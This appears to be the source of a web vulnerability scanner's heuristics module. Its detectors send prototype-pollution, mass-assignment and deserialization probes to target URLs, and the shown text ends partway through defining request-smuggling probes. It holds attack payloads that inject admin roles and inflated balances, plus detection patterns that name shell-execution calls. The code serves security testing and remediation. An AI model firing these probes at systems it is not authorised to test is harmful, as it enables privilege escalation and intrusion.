"""tools/zero_day_heuristics.py

Elengenix Zero-Day & Logic-Vulnerability Heuristics Engine
============================================================

Pattern-based detection engine for high-end vulnerability classes that classical
scanners miss. Designed to be the *flagship* heuristic layer of Elengenix and to
chain into the existing VulnEngine / VulnClass / CVSS infrastructure.

Ten independent detectors, each implemented as a class with one public method
``detect(...)``. The orchestrator (``ZeroDayEngine``) runs them concurrently
against synthetic inputs (a target URL, a sample request, or a sample response),
correlates findings through a graph, and emits a list of normalized
``Finding`` objects compatible with ``vuln_engine.VulnFinding``.

Detectors
---------

1. ``PrototypePollutionDetector``      - JS __proto__ / constructor.prototype gadgets
2. ``MassAssignmentDetector``          - type confusion / unexpected-field reflection
3. ``InsecureDeserializationDetector`` - Java / Python / PHP / Node / .NET magic bytes
4. ``HTTPSmugglingDetector``           - CL.TE / TE.CL raw-socket probing
5. ``RaceConditionDetector``           - TOCTOU via parallel requests
6. ``SSTIDetector``                    - template engine reflection patterns
7. ``GraphQLIntrospectionDetector``    - introspection abuse + mutations + batching
8. ``JWTAlgorithmDetector``            - alg=none / RSA-as-HMAC / kid / jku confusion
9. ``SmartAnomalyDetector``            - statistical baseline + entropy analysis
10. ``FindingGraph``                    - vulnerability-chain correlation engine

Each detector can be used standalone for unit tests or chained via the engine.
All probes are LOCAL heuristics; no external API calls are made.

Conventions
-----------

* 4-space indentation, type hints everywhere, docstrings with Args/Returns.
* Module logger ``logging.getLogger("elengenix.zero_day_heuristics")``.
* UI text uses ``[OK] / [FAIL] / [WARN] / [INFO]`` markers; never emoji.
* Async-first. ``requests`` is used in a ``ThreadPoolExecutor`` fallback when
  ``aiohttp`` is unavailable, but every detector exposes ``async def``.
* Hard timeouts everywhere — a detector must never hang the engine.

Version: 1.0.0
"""
from __future__ import annotations

import asyncio
import base64
import collections
import concurrent.futures
import hashlib
import hmac
import json
import logging
import math
import re
import socket
import ssl
import statistics
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Awaitable, Callable, Dict, Iterable, List, Optional, Sequence, Tuple

try:
    import aiohttp  # type: ignore
except ImportError:  # pragma: no cover - optional runtime dep
    aiohttp = None  # type: ignore

import requests

from ui_components import console, print_info, print_success, print_warning, print_error

from tools.vuln_engine import (
    ExploitMaturity,
    VulnClass,
    VulnFinding,
    calculate_cvss,
    severity_from_cvss,
)

logger = logging.getLogger("elengenix.zero_day_heuristics")


# ═══════════════════════════════════════════════════════════════════════════
#  0. SHARED INFRASTRUCTURE
# ═══════════════════════════════════════════════════════════════════════════


class SeverityLevel(Enum):
    """Engine-internal severity buckets mapped to CVSS later."""

    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


SEVERITY_CVSS_FLOOR: Dict[SeverityLevel, float] = {
    SeverityLevel.INFO: 0.1,
    SeverityLevel.LOW: 3.1,
    SeverityLevel.MEDIUM: 5.0,
    SeverityLevel.HIGH: 7.5,
    SeverityLevel.CRITICAL: 9.5,
}


@dataclass
class Finding:
    """Normalized heuristic finding produced by any detector.

    The engine converts these into ``VulnFinding`` so they integrate with the
    rest of Elengenix (CVSS, ExploitChain, GraphQL, etc.).
    """

    detector: str
    title: str
    severity: SeverityLevel
    vuln_class: VulnClass
    url: str = ""
    method: str = "GET"
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    cwe: List[str] = field(default_factory=list)
    confidence: float = 0.5
    metadata: Dict[str, Any] = field(default_factory=dict)
    references: List[str] = field(default_factory=list)
    timestamp: float = field(default_factory=lambda: time.time())

    def to_vuln_finding(self) -> VulnFinding:
        """Convert this heuristic finding into a ``VulnFinding``.

        The CVSS vector is built from the ``VulnClass`` default; severity is
        derived from the floor table so the score is *at least* the configured
        minimum for the level (heuristic findings often lack full context for
        a precise CVSS calculation).
        """
        cvss_floor = SEVERITY_CVSS_FLOOR.get(self.severity, 5.0)
        vector = _default_vector_for(self.vuln_class)
        score = max(calculate_cvss(vector), cvss_floor)
        score = min(score, 10.0)
        return VulnFinding(
            title=self.title,
            vuln_class=self.vuln_class,
            severity=self.severity.value.capitalize(),
            cvss_score=score,
            cvss_vector=vector,
            url=self.url,
            method=self.method,
            parameter=self.parameter,
            payload=self.payload,
            evidence=self.evidence,
            description=self.description,
            impact=self.severity.value.upper(),
            remediation=self.remediation,
            cwe=self.cwe or self.vuln_class.cwe_ids,
            references=self.references,
            exploit_maturity=ExploitMaturity.PROOF_OF_CONCEPT,
            confidence=self.confidence,
            metadata={
                "detector": self.detector,
                "heuristic_metadata": self.metadata,
            },
        )


def _default_vector_for(vuln_class: VulnClass) -> str:
    """Default CVSS v3.1 vector per vulnerability class.

    The vectors are chosen to roughly match the realistic severity of the
    class. They can be overridden later by the CVSS Calculator with full
    context.
    """
    mapping: Dict[VulnClass, str] = {
        VulnClass.PROTOTYPE_POLLUTION: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        VulnClass.DESERIALIZATION:     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        VulnClass.RACE_CONDITION:      "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
        VulnClass.TEMPLATE_INJECTION:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        VulnClass.GRAPHQL:             "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        VulnClass.JWT:                 "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        VulnClass.HTTP_SMUGGLING:      "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
        VulnClass.BROKEN_ACCESS:       "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        VulnClass.SENSITIVE_DATA:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        VulnClass.CRYPTO:              "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        VulnClass.API_ABUSE:           "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        VulnClass.ZERO_DAY:            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    }
    return mapping.get(vuln_class, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N")


class HTTPClient:
    """Lightweight HTTP client wrapper.

    Prefers ``aiohttp`` (async-native) and falls back to ``requests`` in a
    thread pool when not available. Every probe passes through here so we
    have a single place to enforce timeouts, retries, and error capture.
    """

    def __init__(self, timeout: float = 8.0, max_retries: int = 0, verify_ssl: bool = False):
        self.timeout = timeout
        self.max_retries = max_retries
        self.verify_ssl = verify_ssl
        self._session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=0,
        )
        self._session.mount("http://", adapter)
        self._session.mount("https://", adapter)
        self._executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=8, thread_name_prefix="zd-http"
        )

    # ── Sync helpers ───────────────────────────────────────────────────────

    def request(
        self,
        method: str,
        url: str,
        *,
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        json_body: Any = None,
        data: Optional[Any] = None,
        timeout: Optional[float] = None,
        allow_redirects: bool = True,
    ) -> Optional[requests.Response]:
        """Issue a synchronous request with hard timeout."""
        try:
            return self._session.request(
                method=method.upper(),
                url=url,
                headers=headers or {},
                params=params,
                json=json_body,
                data=data,
                timeout=timeout or self.timeout,
                allow_redirects=allow_redirects,
                verify=self.verify_ssl,
            )
        except requests.RequestException as e:
            logger.debug("HTTP request failed: %s %s -> %s", method, url, e)
            return None

    # ── Async helpers ──────────────────────────────────────────────────────

    async def async_request(
        self,
        method: str,
        url: str,
        *,
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        json_body: Any = None,
        data: Any = None,
        timeout: Optional[float] = None,
        allow_redirects: bool = True,
    ) -> Optional[Dict[str, Any]]:
        """Issue an async request and return a normalized dict.

        Returns ``None`` on transport error. The dict shape is stable so all
        detectors can rely on it (``status``, ``headers``, ``text``, ``body``,
        ``length``, ``elapsed_ms``, ``history``).
        """
        if aiohttp is not None:
            return await self._async_aiohttp(
                method, url, headers=headers, params=params,
                json_body=json_body, data=data, timeout=timeout,
                allow_redirects=allow_redirects,
            )
        return await asyncio.get_running_loop().run_in_executor(
            self._executor,
            lambda: self._sync_to_dict(
                self.request(
                    method, url, headers=headers, params=params,
                    json_body=json_body, data=data, timeout=timeout,
                    allow_redirects=allow_redirects,
                ),
            ),
        )

    async def _async_aiohttp(
        self,
        method: str,
        url: str,
        *,
        headers: Optional[Dict[str, str]],
        params: Optional[Dict[str, Any]],
        json_body: Any,
        data: Any,
        timeout: Optional[float],
        allow_redirects: bool,
    ) -> Optional[Dict[str, Any]]:
        to = aiohttp.ClientTimeout(total=timeout or self.timeout)
        try:
            async with aiohttp.ClientSession(timeout=to) as session:
                start = time.time()
                async with session.request(
                    method.upper(),
                    url,
                    headers=headers or {},
                    params=params,
                    json=json_body,
                    data=data,
                    allow_redirects=allow_redirects,
                    ssl=False if not self.verify_ssl else None,
                ) as resp:
                    body = await resp.read()
                    text = body.decode("utf-8", errors="replace")
                    elapsed_ms = (time.time() - start) * 1000.0
                    return {
                        "status": resp.status,
                        "headers": dict(resp.headers),
                        "body": body,
                        "text": text,
                        "length": len(body),
                        "elapsed_ms": elapsed_ms,
                        "history": [str(h.url) for h in resp.history],
                    }
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
            logger.debug("aiohttp request failed: %s %s -> %s", method, url, e)
            return None

    @staticmethod
    def _sync_to_dict(resp: Optional[requests.Response]) -> Optional[Dict[str, Any]]:
        if resp is None:
            return None
        return {
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "body": resp.content,
            "text": resp.text,
            "length": len(resp.content),
            "elapsed_ms": resp.elapsed.total_seconds() * 1000.0,
            "history": [str(h.url) for h in resp.history],
        }

    def close(self) -> None:
        """Shut down the executor cleanly."""
        try:
            self._executor.shutdown(wait=False, cancel_futures=True)
        except Exception:  # pragma: no cover - best effort
            pass


def _entropy(data: str) -> float:
    """Shannon entropy of a string (0..8 bits per byte)."""
    if not data:
        return 0.0
    counts = collections.Counter(data)
    total = len(data)
    return -sum(
        (c / total) * math.log2(c / total) for c in counts.values() if c
    )


def _shannon(data: bytes) -> float:
    """Shannon entropy of a byte string."""
    if not data:
        return 0.0
    counts = collections.Counter(data)
    total = len(data)
    return -sum(
        (c / total) * math.log2(c / total) for c in counts.values() if c
    )


def _short_hash(*parts: str) -> str:
    """Stable short hash for deduplication."""
    h = hashlib.sha256()
    for p in parts:
        h.update(p.encode("utf-8", errors="replace"))
        h.update(b"|")
    return h.hexdigest()[:12]


# ═══════════════════════════════════════════════════════════════════════════
#  1. PROTOTYPE POLLUTION DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


# Known JS gadgets — if these libraries/patterns are observed in the response or
# in the target's technology stack, a prototype pollution becomes much more
# dangerous (turns into RCE / XSS).
PROTO_POLLUTION_GADGETS = [
    "lodash.merge", "lodash.defaultsdeep", "_.merge",
    "jQuery.extend", "$.extend",
    "deep-extend", "merge-deep", "lodash._.merge",
    "Object.assign", "JSON.parse(JSON.stringify(...))",
    "Vue.set", "React.createElement",
    "ejs", "pug", "handlebars",
    "express.bodyParser", "express.urlencoded({extended:true})",
]

PROTO_PROBE_PAYLOADS = [
    # Standard pollution probe — uses `__proto__` to inject a canary.
    {"__proto__": {"polluted": "elenheur-1337"}},
    # Prototype pollution via `constructor.prototype`.
    {"constructor": {"prototype": {"polluted": "elenheur-1337"}}},
    # Object.assign / spread style pollution.
    # NOTE: This is JSON-encoded as a string so detectors downstream can
    # dispatch to the correct gadget check.
    {"__proto__": {"isAdmin": True, "role": "admin"}},
    # Nested path pollution attempt.
    {"a": {"__proto__": {"polluted": "elenheur-1337"}}},
]

# Field names that, when accepted and reflected back, suggest an object
# pollution / mass-assignment sink.
DANGEROUS_FIELDS = [
    "isAdmin", "is_admin", "admin", "role", "group", "groups",
    "balance", "credit", "credits", "wallet", "amount",
    "userId", "user_id", "uid", "ownerId", "owner_id",
    "verified", "isVerified", "is_verified", "approved",
    "password", "passwd", "token", "apiKey", "api_key",
    "permissions", "privileges", "accessLevel", "access_level",
]


class PrototypePollutionDetector:
    """Detect JavaScript prototype pollution vulnerabilities.

    The detector is heuristic. It does not execute JavaScript; instead it:

    * Sends canonical prototype pollution payloads (via JSON POST).
    * Inspects the response for canary reflection (``polluted`` key, ``isAdmin``
      reflection, ``role`` changes).
    * Cross-references response content with known gadget patterns
      (``lodash.merge``, ``Object.assign`` references, ``ejs``/``pug`` stack
      traces, etc.).
    * Analyzes error / stack traces for ``TypeError: Cannot set property``,
      ``Object prototype``, ``__proto__`` mentions.
    """

    name = "prototype_pollution"

    STACK_PATTERNS = [
        r"Cannot set property .* of .* which has only a getter",
        r"prototype of object is not extensible",
        r"Object\.prototype",
        r"__proto__",
        r"prototype pollution",
        r"merge.*__proto__",
        r"deep-extend",
        r"lodash.*merge",
    ]

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    async def detect(self, target: str, *, context: Optional[Dict[str, Any]] = None) -> List[Finding]:
        """Run prototype pollution probes against ``target``.

        Args:
            target: URL or base URL to probe.
            context: Optional context dict. Recognized keys:
                ``headers``, ``paths`` (list of URLs to probe).

        Returns:
            List of ``Finding`` objects. Empty if nothing detected.
        """
        context = context or {}
        headers = context.get("headers") or {"Content-Type": "application/json"}
        paths = context.get("paths") or [target]
        findings: List[Finding] = []

        for url in paths:
            for payload in PROTO_PROBE_PAYLOADS:
                resp = await self.http.async_request(
                    "POST", url, headers=headers, json_body=payload,
                )
                if resp is None:
                    continue
                finding = self._analyze_response(url, payload, resp)
                if finding is not None:
                    findings.append(finding)

            # Gadget stack-trace pass (even on error 500)
            error_resp = await self.http.async_request(
                "POST", url, headers=headers, json_body={"__proto__": {"x": "y" * 64}},
            )
            if error_resp is not None and self._has_stack_signal(error_resp):
                findings.append(self._build_stack_finding(url, error_resp))
        return findings

    def _analyze_response(
        self,
        url: str,
        payload: Dict[str, Any],
        resp: Dict[str, Any],
    ) -> Optional[Finding]:
        text = (resp.get("text") or "").lower()
        body = resp.get("body") or b""
        if resp.get("status", 0) >= 500:
            return self._build_stack_finding(url, resp, payload=payload)

        # Canary reflection detection.
        if "elenheur-1337" in text:
            sev = SeverityLevel.HIGH if self._mentions_gadget(text) else SeverityLevel.MEDIUM
            return Finding(
                detector=self.name,
                title="Prototype pollution canary reflected in response",
                severity=sev,
                vuln_class=VulnClass.PROTOTYPE_POLLUTION,
                url=url,
                method="POST",
                payload=json.dumps(payload),
                evidence="Response contains canary token 'elenheur-1337' from __proto__ payload.",
                description=(
                    "Server accepted a __proto__ injection payload and "
                    "reflected the canary. This indicates that user-controlled "
                    "keys merge into Object.prototype, leading to widespread "
                    "logic flaws, authentication bypass and potentially RCE "
                    "when chained with known gadgets (lodash.merge, jQuery, etc.)."
                ),
                remediation=(
                    "Strip '__proto__', 'constructor', and 'prototype' keys "
                    "from user input. Use Object.create(null) or Map for "
                    "trustworthy dictionaries. Pin vulnerable libraries."
                ),
                references=[
                    "https://owasp.org/www-community/attacks/Prototype_Pollution",
                    "https://portswigger.net/web-security/prototype-pollution",
                ],
                confidence=0.8,
                metadata={"canary": "elenheur-1337", "status": resp.get("status")},
            )

        # Mass-assignment type confusion: did the response echo an injected
        # privileged field back?
        for field in ("isadmin", "role", "balance", "verified"):
            if f'"{field}"' in text or f"'{field}'" in text:
                if any(s in text for s in ("admin", "999999", "true", "verified")):
                    return Finding(
                        detector=self.name,
                        title=f"Mass assignment / pollution via __proto__ -> {field}",
                        severity=SeverityLevel.HIGH,
                        vuln_class=VulnClass.PROTOTYPE_POLLUTION,
                        url=url,
                        method="POST",
                        payload=json.dumps(payload),
                        evidence=f"Field '{field}' reflects injected value.",
                        description=(
                            "Server reflected a sensitive field injected via "
                            "__proto__ pollution. This is a classic "
                            "mass-assignment / type-confusion bug."
                        ),
                        remediation="Apply an allowlist of permitted keys before persisting.",
                        confidence=0.7,
                    )

        # Binary / entropy check — pollution payloads sometimes yield bizarre
        # serialized responses.
        if body and _shannon(body) > 7.0 and resp.get("status", 0) == 200:
            return Finding(
                detector=self.name,
                title="High-entropy response after __proto__ probe",
                severity=SeverityLevel.LOW,
                vuln_class=VulnClass.PROTOTYPE_POLLUTION,
                url=url,
                method="POST",
                payload=json.dumps(payload),
                evidence=f"Shannon entropy={_shannon(body):.2f}",
                description="Server returned unusually high-entropy bytes after a pollution probe.",
                remediation="Audit server-side merge logic for unsafe deep merges.",
                confidence=0.3,
            )
        return None

    def _has_stack_signal(self, resp: Dict[str, Any]) -> bool:
        text = resp.get("text") or ""
        for pat in self.STACK_PATTERNS:
            if re.search(pat, text, re.IGNORECASE):
                return True
        return False

    def _mentions_gadget(self, text: str) -> bool:
        for gadget in PROTO_POLLUTION_GADGETS:
            if gadget.lower() in text:
                return True
        return False

    def _build_stack_finding(
        self,
        url: str,
        resp: Dict[str, Any],
        payload: Optional[Dict[str, Any]] = None,
    ) -> Finding:
        sev = SeverityLevel.CRITICAL if resp.get("status", 0) >= 500 else SeverityLevel.HIGH
        return Finding(
            detector=self.name,
            title="Server error / stack trace contains prototype pollution signal",
            severity=sev,
            vuln_class=VulnClass.PROTOTYPE_POLLUTION,
            url=url,
            method="POST",
            payload=json.dumps(payload) if payload else "",
            evidence=(resp.get("text") or "")[:600],
            description=(
                "Server returned an error containing keywords associated with "
                "prototype pollution (Object.prototype, __proto__, merge, "
                "deep-extend, lodash)."
            ),
            remediation="Audit merge functions and reject __proto__ keys.",
            confidence=0.6,
        )


# ═══════════════════════════════════════════════════════════════════════════
#  2. MASS ASSIGNMENT / TYPE CONFUSION DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


MASS_ASSIGN_FIELDS = [
    # (field, attacker value, expected echo, severity)
    ("isAdmin", True,         "true",      SeverityLevel.CRITICAL),
    ("is_admin", True,        "true",      SeverityLevel.CRITICAL),
    ("admin", True,           "true",      SeverityLevel.CRITICAL),
    ("role", "admin",         "admin",     SeverityLevel.CRITICAL),
    ("group", "admins",       "admins",    SeverityLevel.HIGH),
    ("balance", 999999,       "999999",    SeverityLevel.HIGH),
    ("credits", 999999,       "999999",    SeverityLevel.HIGH),
    ("wallet", 999999,        "999999",    SeverityLevel.HIGH),
    ("verified", True,        "true",      SeverityLevel.MEDIUM),
    ("isVerified", True,      "true",      SeverityLevel.MEDIUM),
    ("approved", True,        "true",      SeverityLevel.MEDIUM),
    ("userId", 1,             '"1"',       SeverityLevel.HIGH),
    ("user_id", 1,            '"1"',       SeverityLevel.HIGH),
    ("uid", 1,                '"1"',       SeverityLevel.HIGH),
    ("ownerId", 1,            '"1"',       SeverityLevel.HIGH),
    ("accessLevel", "root",   "root",      SeverityLevel.HIGH),
    ("permissions", "[\"*\"]", "*",         SeverityLevel.HIGH),
]


class MassAssignmentDetector:
    """Probe endpoints for mass-assignment / type confusion bugs.

    Mass assignment happens when a backend blindly copies user input into a
    domain model. The detector sends a baseline request and a poisoned
    request (with extra privileged fields); if the response reflects the
    injected field or the response length / status diverges in a suspicious
    way, a finding is produced.
    """

    name = "mass_assignment"

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    async def detect(
        self,
        target: str,
        *,
        method: str = "POST",
        baseline_body: Optional[Dict[str, Any]] = None,
        context: Optional[Dict[str, Any]] = None,
    ) -> List[Finding]:
        """Run mass-assignment probes.

        Args:
            target: URL to probe.
            method: HTTP method (``POST``/``PUT``/``PATCH``).
            baseline_body: Minimal legitimate body (defaults to
                ``{"username": "elenheur"}``).
            context: Optional dict with ``headers``.

        Returns:
            Findings list.
        """
        context = context or {}
        headers = {"Content-Type": "application/json"}
        headers.update(context.get("headers") or {})
        baseline = baseline_body or {"username": "elenheur", "email": "t@x.io"}
        findings: List[Finding] = []

        baseline_resp = await self.http.async_request(
            method, target, headers=headers, json_body=baseline,
        )
        if baseline_resp is None:
            return findings
        baseline_text = baseline_resp.get("text") or ""
        baseline_len = baseline_resp.get("length", 0)
        baseline_status = baseline_resp.get("status", 0)

        for field, value, expected_echo, severity in MASS_ASSIGN_FIELDS:
            poisoned = dict(baseline)
            poisoned[field] = value
            resp = await self.http.async_request(
                method, target, headers=headers, json_body=poisoned,
            )
            if resp is None:
                continue
            text = resp.get("text") or ""

            # Direct echo detection — value present in response.
            echoed = expected_echo.lower() in text.lower()
            # Length delta detection — response grew meaningfully.
            len_delta = abs(resp.get("length", 0) - baseline_len)
            grew_significantly = len_delta > max(50, baseline_len * 0.25)
            # Status flip — 200 -> 5xx or 200 -> 201 might be diagnostic.
            status_changed = resp.get("status") != baseline_status

            if echoed and value not in baseline:
                findings.append(Finding(
                    detector=self.name,
                    title=f"Mass assignment: server echoed injected field '{field}'",
                    severity=severity,
                    vuln_class=VulnClass.BROKEN_ACCESS,
                    url=target,
                    method=method,
                    parameter=field,
                    payload=json.dumps({field: value}),
                    evidence=f"Injected value '{expected_echo}' appears in response.",
                    description=(
                        f"Server reflected the injected field '{field}' = "
                        f"{value!r} back to the client, indicating that the "
                        "endpoint binds arbitrary user input to internal "
                        "domain fields. This is a classic mass-assignment "
                        "vulnerability (OWASP API1:2023)."
                    ),
                    remediation=(
                        "Apply an explicit allowlist of writable fields. "
                        "Never bind request payloads directly to ORM models."
                    ),
                    cwe=["CWE-915", "CWE-639"],
                    references=[
                        "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
                    ],
                    confidence=0.85,
                    metadata={
                        "field": field,
                        "value": value,
                        "status_changed": status_changed,
                    },
                ))
            elif grew_significantly and field in DANGEROUS_FIELDS:
                findings.append(Finding(
                    detector=self.name,
                    title=f"Mass assignment: response grew after injecting '{field}'",
                    severity=SeverityLevel.MEDIUM,
                    vuln_class=VulnClass.BROKEN_ACCESS,
                    url=target,
                    method=method,
                    parameter=field,
                    payload=json.dumps({field: value}),
                    evidence=(
                        f"Baseline len={baseline_len}, poisoned len="
                        f"{resp.get('length')}, delta={len_delta}."
                    ),
                    description=(
                        "Server response grew notably when an unexpected "
                        "field was added to the request payload, suggesting "
                        "that the field was accepted and possibly persisted."
                    ),
                    remediation="Strip unknown keys before persistence.",
                    confidence=0.5,
                    metadata={"len_delta": len_delta, "field": field},
                ))
        return findings


# ═══════════════════════════════════════════════════════════════════════════
#  3. INSECURE DESERIALIZATION DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


# Language-specific detection patterns applied to *response bodies* (and any
# encoded variant of them) to surface serialized objects that the server
# accepted and is now reflecting.
DESER_SIGNATURES = {
    "java": {
        "magic_hex": "ACED0005",          # Java ObjectInputStream
        "regex": [
            r"\b(?:java\.io\.|java\.rmi\.|org\.springframework\.|com\.fasterxml\.jackson\.|java\.util\.|java\.lang\.Process)\b",
            r"\b(?:ObjectInputStream|readObject|writeObject|XMLDecoder)\b",
            r"\b(?:InvokerTransformer|Gadgets|CommonsCollections)\b",
        ],
        "content_types": ["application/x-java-serialized-object"],
    },
    "python": {
        "magic_b64_prefixes": ["gAS"],    # pickle protocol 2/4
        "regex": [
            r"\b__reduce__\b",
            r"\b__class__\b\s*:\s*['\"]",
            r"\bcposix\b",
            r"\bnt\b\s*->",
            r"\b(?:subprocess|os\.system|pickle\.loads)\b",
        ],
    },
    "php": {
        "regex": [
            r'\bO:\d+:"[A-Za-z\\\_]+":\d+:\{',  # O:8:"stdClass":...
            r'\ba:\d+:\{',                       # PHP array shorthand
            r'\bs:\d+:"[^"]+";',                 # PHP string shorthand
            r'\b__PHP_Incomplete_Class\b',
        ],
    },
    "node": {
        "regex": [
            r"Buffer\.from\([\"'][A-Za-z0-9+/=]{50,}[\"'],\s*[\"']base64[\"']\)",
            r'"_isBuffer"\s*:\s*true',
            r'"type"\s*:\s*[\'"]Buffer[\'"]',
        ],
    },
    "dotnet": {
        "regex": [
            r'__VIEWSTATE[\'"]?\s*[,=:]\s*[\'"]?[A-Za-z0-9+/=]{50,}',
            r'\bSystem\.Web\.UI\.ObjectStateFormatter\b',
            r'\bLosFormatter\b',
        ],
    },
}

# Harmless probe payloads — these should NOT execute server-side code on a
# patched system, but they expose class names if deserialized eagerly.
HARMLESS_PROBE_PAYLOADS = {
    "java_hex": "ACED0005",  # Magic bytes alone
    "python_b64": base64.b64encode(b"\x80\x04\x95").decode(),  # pickle proto 4 header
    "php_serial": 'O:8:"stdClass":0:{}',
    "node_buffer": "data:application/octet-stream;base64," + base64.b64encode(b"AAAA").decode(),
}


class InsecureDeserializationDetector:
    """Detect deserialization sinks across Java/Python/PHP/Node/.NET.

    The detector performs two complementary passes:

    1. *Response inspection* — looks at the response body for magic bytes or
       language-specific serialized structures that indicate the server
       accepted and echoed back an object.
    2. *Active probing* — sends a tiny, harmless payload of each flavor and
       checks for stack traces that contain language-runtime class names
       (``java.io.*``, ``__reduce__``, ``__PHP_Incomplete_Class``,
       ``Buffer.from``, ``__VIEWSTATE`` parsing errors).
    """

    name = "insecure_deserialization"

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    async def detect(self, target: str, *, context: Optional[Dict[str, Any]] = None) -> List[Finding]:
        """Run deserialization probes.

        Args:
            target: URL to probe.
            context: Optional dict with ``headers`` and ``method`` (default
                ``POST``).

        Returns:
            Findings list.
        """
        context = context or {}
        method = context.get("method", "POST")
        headers = {"Content-Type": "application/json"}
        headers.update(context.get("headers") or {})
        findings: List[Finding] = []

        # Pass 1 — inspect a normal GET response for reflection signatures.
        baseline = await self.http.async_request("GET", target, headers=headers)
        if baseline is not None:
            findings.extend(self._inspect_response(target, baseline))

        # Pass 2 — send a harmless probe per language and inspect the response.
        probes: List[Tuple[str, str, str]] = [
            ("java",   method, HARMLESS_PROBE_PAYLOADS["java_hex"]),
            ("python", method, HARMLESS_PROBE_PAYLOADS["python_b64"]),
            ("php",    method, HARMLESS_PROBE_PAYLOADS["php_serial"]),
            ("node",   method, HARMLESS_PROBE_PAYLOADS["node_buffer"]),
        ]
        for lang, m, payload in probes:
            probe_headers = dict(headers)
            probe_headers["Content-Type"] = "application/octet-stream"
            resp = await self.http.async_request(
                m, target, headers=probe_headers, data=payload,
            )
            if resp is None:
                continue
            findings.extend(self._inspect_response(target, resp, hint=lang))
        return findings

    def _inspect_response(
        self,
        target: str,
        resp: Dict[str, Any],
        hint: Optional[str] = None,
    ) -> List[Finding]:
        text = resp.get("text") or ""
        body = resp.get("body") or b""
        findings: List[Finding] = []

        # Build a normalized view (raw text + hex of first 64 bytes).
        head_hex = (body[:64] or b"").hex().upper()
        # Build a base64 view (some signatures are easier to spot encoded).
        b64 = base64.b64encode(body[:128]).decode("ascii", errors="replace")

        for lang, sig in DESER_SIGNATURES.items():
            # Magic byte detection
            magic = sig.get("magic_hex")
            if magic and magic in head_hex:
                findings.append(self._finding(
                    lang, target, resp,
                    f"Magic bytes {magic} present in response body.",
                    severity=SeverityLevel.HIGH,
                ))
            # Base64 magic detection — check both the re-encoded body and the
            # raw response text (since servers often return the pickle as a
            # base64 string directly).
            head_b64 = b64[:64]
            for prefix in sig.get("magic_b64_prefixes", []):
                if prefix in head_b64 or prefix in text[:64]:
                    findings.append(self._finding(
                        lang, target, resp,
                        f"Base64 prefix {prefix!r} found in response (suggests pickle).",
                        severity=SeverityLevel.HIGH,
                    ))
            # Regex pattern detection
            for pattern in sig.get("regex", []):
                m = re.search(pattern, text, re.IGNORECASE)
                if m:
                    findings.append(self._finding(
                        lang, target, resp,
                        f"Pattern '{pattern}' matched: {m.group(0)[:80]!r}",
                        severity=SeverityLevel.HIGH if hint == lang else SeverityLevel.MEDIUM,
                    ))
        return findings

    def _finding(
        self,
        language: str,
        target: str,
        resp: Dict[str, Any],
        reason: str,
        severity: SeverityLevel,
    ) -> Finding:
        vuln_class = (
            VulnClass.DESERIALIZATION if language in ("java", "python", "php", "node")
            else VulnClass.CRYPTO
        )
        cwe = {
            "java": ["CWE-502", "CWE-915"],
            "python": ["CWE-502"],
            "php": ["CWE-502", "CWE-915"],
            "node": ["CWE-502", "CWE-915"],
            "dotnet": ["CWE-502"],
        }.get(language, ["CWE-502"])
        return Finding(
            detector=self.name,
            title=f"Insecure deserialization signature ({language})",
            severity=severity,
            vuln_class=vuln_class,
            url=target,
            method=resp.get("_method", "POST") if isinstance(resp.get("_method"), str) else "POST",
            evidence=reason,
            description=(
                f"Response from {target} exhibits {language} deserialization "
                f"characteristics: {reason}. The endpoint may accept and "
                "deserialize untrusted input."
            ),
            remediation=(
                "Avoid deserializing untrusted input. Use data-only formats "
                "(JSON), implement integrity checks (HMAC, signature), and "
                "patch known gadget chains."
            ),
            cwe=cwe,
            references=[
                "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
                "https://github.com/frohoff/ysoserial",
            ],
            confidence=0.65,
            metadata={"language": language, "reason": reason},
        )


# ═══════════════════════════════════════════════════════════════════════════
#  4. HTTP REQUEST SMUGGLING DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


# Raw HTTP requests crafted to expose CL.TE / TE.CL parsing differences.
# They are sent on a *raw socket* (no HTTP library) to keep the bytes
# exactly as we want them.
SMUGGLING_PROBES = {
    "cl_te_smuggle": (
        "POST / HTTP/1.1\r\n"
